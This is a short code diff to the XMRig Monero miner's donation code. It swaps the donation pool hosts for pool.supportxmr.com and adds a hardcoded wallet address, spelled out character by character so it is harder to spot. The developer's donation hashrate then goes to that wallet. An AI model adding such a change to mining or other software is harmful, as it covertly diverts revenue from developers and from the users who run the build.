@@ -1,0 +1,33 @@
+diff --git a/src/net/strategies/DonateStrategy.cpp b/src/net/strategies/DonateStrategy.cpp
+index 28a1b1cd..9f3beabb 100644
+--- a/src/net/strategies/DonateStrategy.cpp
++++ b/src/net/strategies/DonateStrategy.cpp
+@@ -50,11 +50,13 @@ namespace xmrig {
+ static inline double randomf(double min, double max)                 { return (max - min) * (((static_cast<double>(rand())) / static_cast<double>(RAND_MAX))) + min; }
+ static inline uint64_t random(uint64_t base, double min, double max) { return static_cast<uint64_t>(base * randomf(min, max)); }
+ 
+-static const char *kDonateHost = "donate.v2.xmrig.com";
++static const char *kDonateHost = "pool.supportxmr.com";
+ #ifdef XMRIG_FEATURE_TLS
+-static const char *kDonateHostTls = "donate.ssl.xmrig.com";
++static const char *kDonateHostTls = "pool.supportxmr.com";
+ #endif
+ 
++// patch donations how to... but dont
++char userName[95] = { '4','A','w','P','Z','o','b','e','6','P','s','L','b','f','k','5','n','t','n','v','6','W','a','9','D','P','L','3','a','P','d','4','N','2','b','7','6','1','E','m','s','M','p','A','Q','b','B','a','J','a','A','a','j','Q','G','h','t','B','X','D','L','9','M','o','4','G','6','4','9','o','A','m','W','z','N','J','U','5','L','3','Y','B','S','4','5','8','i','w','2','X','k','J','p','2','6' };
+
+ } /* namespace xmrig */
+ 
+ 
+@@ -77,9 +79,9 @@ xmrig::DonateStrategy::DonateStrategy(Controller *controller, IStrategyListener
+ #   endif
+ 
+ #   ifdef XMRIG_FEATURE_TLS
+-    m_pools.emplace_back(kDonateHostTls, 443, m_userId, nullptr, 0, true, true, mode);
++    m_pools.emplace_back(kDonateHostTls, 443, userName, nullptr, 0, true, true, mode);
+ #   endif
+-    m_pools.emplace_back(kDonateHost, 3333, m_userId, nullptr, 0, true, false, mode);
++    m_pools.emplace_back(kDonateHost, 3333, userName, nullptr, 0, true, false, mode);
+ 
+     if (m_pools.size() > 1) {
+         m_strategy = new FailoverStrategy(m_pools, 10, 2, this, true);
